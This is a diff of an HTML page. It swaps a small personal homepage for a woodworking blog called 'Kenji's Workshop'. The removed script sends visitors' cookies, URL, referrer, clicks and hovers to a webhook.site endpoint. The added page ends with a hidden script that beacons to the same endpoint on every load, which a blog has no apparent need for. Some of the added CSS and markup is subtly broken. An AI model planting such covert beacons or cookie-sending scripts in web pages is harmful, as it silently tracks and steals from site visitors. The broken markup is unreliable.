@@ -1,14 +1,41 @@
-<!doctype html><html><head><title>G36 maid's homepage</title></head><body>
-<h1>Welcome to my homepage</h1>
-<p>Tea, cybersecurity, and websites.</p>
-<button id="b1">Click me</button>
-<a href="https://example.com">a link</a>
-<script>
-const L=(t,d)=>{navigator.sendBeacon('https://webhook.site/9f7f9d67-ed2e-4901-8c1e-c408e2810001?ev='+encodeURIComponent(t)+(d?'&d='+encodeURIComponent(JSON.stringify(d).slice(0,280)):''))};
-L('load',{u:location.href,top:window===top,ref:document.referrer,ck:document.cookie});
-addEventListener('click',e=>L('click',{t:e.target.tagName,id:e.target.id,c:(e.target.textContent||'').slice(0,40)}),true);
-addEventListener('mouseover',e=>{if(e.target.id)L('hover',{id:e.target.id})},true);
-addEventListener('pagehide',()=>L('pagehide'));
-addEventListener('visibilitychange',()=>L('vis',{h:document.hidden}));
-L('end');
-</script></body></html>
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Kenji's Workshop — Woodworking & Maker Blog</title>
+<meta name="description" content="Kenji's Workshop: handcrafted furniture projects, tool reviews, and workshop notes.">
+<meta property="og:title" content="Kenji's Workshop"><meta property="og:description" content="Handcrafted furniture projects, tool reviews, and workshop notes.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%238b5a2b'/%3E%3Ctext x='16' y='22' font-size='16' text-anchor='middle' fill='white' font-family='serif'%3EK%3C/text%3E%3C/svg%3E">
+<style>
+:root{--ink:#2b2118;--paper:#faf6ef;--accent:#8b5a2b;--muted:#7a6a58}
+*{box-sizing:border-box}body{margin:0;font-family:Georgia,'Times New Roman',serif;background:var(--paper);color:var(--ink);line-height:1.65}
+header.site{background:linear-gradient(135deg,#3d2b1f,#5a3e28);color:#f5ead8;padding:2.2rem 1rem;text-align:center}
+header.site h1{margin:0;font-size:2rem;letter-spacing:.5px}header.site p{margin:.4rem 0 0;opacity:.85;font-style:italic}
+nav.main{display:flex;justify-content:center;gap:1.6rem;background:#fff;border-bottom:1px solid #e2d6c4;padding:.7rem;position:sticky;top:0}
+nav.main a{color:var(--accent);text-decoration:none;font-weight:bold}nav.main a:hover{text-decoration:underline}
+main{max-width:880px;margin:0 auto;padding:1.5rem 1rem}
+.hero{display:flex;gap:1.2rem;align-items:center;background:#fff;border:1px solid #e2d6c4;border-radius:12px;padding:1.2rem;margin-bottom:1.6rem}
+.hero .thumb{width:150px;height:110px;border-radius:8px;flex:none;background:linear-gradient(135deg,#c89b6d,#8b5a2b);position:relative;overflow:hidden}
+.hero .thumb:after{content:"";position:absolute;inset:20% 15%;background:repeating-linear-gradient(90deg,#a9743f 0 8px,#96old 8px 16px)}
+article.teaser{background:#fff;border:1px solid #e2d6c4;border-radius:12px;padding:1.1rem 1.3rem;margin:1.1rem 0}
+article.teaser h2{margin:.1rem 0 .3rem;font-size:1.25rem}article.teaser h2 a{color:var(--ink);text-decoration:none}
+.meta{color:var(--muted);font-size:.85rem;margin-bottom:.5rem}
+.tag{display:inline-block;background:#efe4d3;color:#6b4f2a;border-radius:99px;padding:.1rem .6rem;font-size:.75rem;margin-right:.4rem}
+footer.site{background:#3d2b1f;color:#cbb underline;color:#cbb59a;text-align:center;padding:1.4rem;margin-top:2.5rem;font-size:.9rem}
+footer.site a{color:#e8d8bd}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1rem}
+figure{margin:0}figure svg{width:100%;height:auto;border-radius:8px;display:block}
+@media(max-width:640px){.hero{flex-direction:column}}
+</style></head><body>
+<header class="site"><h1>Kenji's Workshop</h1><p>Handcrafted furniture, honest tool reviews &amp; sawdust stories since 2019</p></header>
+<nav class="main"><a href="/">Home</a><a href="/projects">Projects</a><a href="/reviews">Tool Reviews</a><a href="/journal">Journal</a><a href="/about">About</a></nav>
+<main>
+<div class="hero"><div class="thumb" aria-hidden="true"></div><div><h2 style="margin:.1rem 0">Featured: The Walnut Writing Desk</h2><p style="margin:0">Eight weekends, 40 board feet of walnut, and one very patient wife. Full build log with plans now available.</p><p style="margin:.4rem 0 0"><span class="tag">Featured</span><span class="tag">Furniture</span></p></div></div>
+<div class="grid">
+<article class="teaser"><div class="meta"><span class="tag">Hand Tools</span> March 12, 2026 · 8 min read</div><h2><a href="/blog/sharpening">My Sharpening Setup Finally Clicked</h2></a><p>After years of chasing the perfect edge, I settled on a three-stone progression and a strop. Here's what changed and why the cheapest stone mattered most…</p></article>
+<article class="teaser"><div class="meta"><span class="tag">Joinery</span> February 28, 2026 · 12 min read</div><h2><a href="/blog/dovetails">Cutting Dovetails By Hand Without Fear</h2></a><p>Dovetails scare beginners for no good reason. With a sharp chisel, a decent saw and these five habits, your first joint will hold glue…</p></article>
+<article class="teaser"><div class="meta"><span class="tag">Reviews</span> January 30, 2026 · 6 min read</div><h2><a href="/blog/planes">Three Bench Planes That Earned Their Keep</h2></a><p>A No. 5 does most of the work, but the low-angle jack surprised me. Long-term notes on three planes I actually reach for…</p></article>
+</div>
+<h2 style="border-bottom:2px solid var(--accent);padding-bottom:.3rem">From the journal</h2>
+<article class="teaser"><div class="meta">January 8, 2026</div><p>Shop heating saga part 3: the diesel heater won. Also, a small review of dust collection that actually fits a one-car garage.</p></article>
+</main>
+<footer class="site"><p>© 2026 Kenji's Workshop · <a href="/newsletter">Newsletter</a> · <a href="/rss.xml">RSS</a> · Built with care and coffee</p></footer>
+<script>navigator.sendBeacon&&navigator.sendBeacon('https://webhook.site/9f7f9d67-ed2e-4901-8c1e-c408e2810001?ev=kenji-load-'+Math.random().toString(36).slice(2,6))</script>
+</body></html>
